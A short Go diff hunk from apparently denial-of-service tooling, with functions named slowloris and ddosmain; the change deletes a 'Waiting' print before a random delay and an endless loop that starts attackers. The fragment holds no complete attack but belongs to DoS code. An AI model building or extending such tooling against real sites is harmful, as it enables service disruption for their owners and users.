@@ -118,7 +118,6 @@ func slowloris(url string) {
 func ddosmain(url string) {
 	attackers := 1
 	x := randomNumber(15)
-	fmt.Print("Waiting: ", x)
 	time.Sleep(time.Duration(x) * time.Second)
 	for {
 		for i := 0; i < attackers; i++ {
